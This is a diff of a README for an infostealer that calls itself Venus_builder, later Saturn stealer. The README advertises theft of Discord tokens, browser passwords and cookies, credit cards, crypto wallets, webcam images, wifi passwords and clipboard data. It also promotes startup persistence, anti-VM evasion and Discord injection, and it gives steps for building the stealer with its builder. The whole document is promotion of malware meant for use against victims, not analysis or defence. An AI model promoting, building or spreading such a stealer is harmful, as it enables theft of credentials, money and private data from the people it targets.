@@ -1,63 +1,56 @@
-  ![image](https://github.com/hinmis/Venus_grabber/assets/141452638/d2889e19-925a-406c-92d0-73e4af57b98c)
 
 # Venus_builder
+
+The MOST powerful stealer (Cookie stealer, Discord token stealer, Roblox stealer, Password stealer, Credit card stealer, Autofill stealer, Steam stealer) Much MORE
+
   ![Capture d'écran 2024-02-01 172809](https://github.com/hinmis/Venus_Grabber/assets/141452638/c747e95d-9fe0-48d3-a820-235ab41dc3ca)
 
-• UPDATE WEEKLY
+  ![image](https://github.com/hinmis/Venus_Grabber/assets/141452638/5cb9196f-ef6e-4ac2-a58f-cde28e3ed555)
 
-# Features
+  
+# ✨Features
 
-• Grabs Roblox cookies from Roblox Studio
+🎮 - Steal Steam Credentials, Riot games, Minecraft session, Epic games, uplay, Growtopia
 
-• Grabs Minecraft sessions
+🔒 - Bypass Better Discord and Discord Token Protector
 
-• Grabs Google Chrome passwords
+🖼️ - Custom icon
 
-• Grabs Google Chrome cookies
+🤖 - Website Cookie Information (Spotify, Roblox, Tiktok, Guilded, Patreon, Twitch, Instagram, Twitter)
 
-• Grabs victim machine info
+🖥️ - System Information Stealer: Steal graphic card name (and other data), cpu name (and other data)
 
-• Grabs Windows product key
+📸 - Steal Webcam Screenshot
 
-• Grabs screenshot
+🔒 - Steal Wifi Password
 
-• Steals Discord Tokens.
- 
-• Steals Steam Session.
+🍪 - Cookie Stealer
 
-• Steals Epic Session.
+📁 - Telegram Session stealer
 
-• Steals Uplay Session.
+🔒 - Password Stealer
 
-• Steals Passwords From Many Browsers.
+📝 - Autofill Stealer: Steal autofill of all browsers
 
-• Steals Cookies From Many Browsers.
+📝 - Credit card stealer
 
-• Steals History From Many Browsers.
+📋 - Clipboard Copy: Copies whatever is in the target's clipboard
 
-• Steals Autofills From Many Browsers.
+💻 - Startup Running: Starts up whenever the target's machine does
 
-• Steals Minecraft Session Files.
+💰 - Crypto Wallet Stealer (- 💸 Zcash 🚀 Armory 📀 Bytecoin 💵 Jaxx 💎 Exodus 📉 Ethereum 🔨 Electrum 🕹️ AtomicWallet 💹 Guarda ⚡ Coinomi 🦊 MetaMask )
 
-• Steals Telegram Session Files.
+👥 - Private Information Stealer: Grabs Discord token, password, phone number, email, username and global username and HQ friends, HQ Guilds, user connexion and change user about me
 
-• Steals Crypto Wallets.
+📥 - Discord Injection
 
-• Steals Roblox Cookies.
+📂 - Anti-VM
 
-• Steals Growtopia Session.
+📸 - Screenshot: Takes a screenshot of the target's screen
 
-• Steals IP Information.
+🪐 - Browser History Stealer: Steals history search of multiple browsers (Chrome, Opera/GX, Firefox, Edge, Safari, Internet Explorer, Brave)
 
-• Steals System Info.
-
-• Steals Saved Wifi Passwords.
-
-• Steals Common Files.
-
-• Captures Screenshot.
-
-• Captures Webcam Image.
+🪐 - Much MORE!
 
 # Requirements
 
@@ -75,15 +68,16 @@
 
 • Verify the installation by executing python --version in CMD.
 
-• Download Venus grabber.
+• Download Saturn stealer.
 
 • Extract the zip file.
 
-• Navigate to the Venus Grabber folder and double click install.bat file.
+• Navigate to the Saturn Stealer folder and double click install.bat file.
 
 • After it downloads the requirement double click Builder.bat
 
 • Fill in the fields of the builder and press the Build button
+
 
 # License
 •  By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.
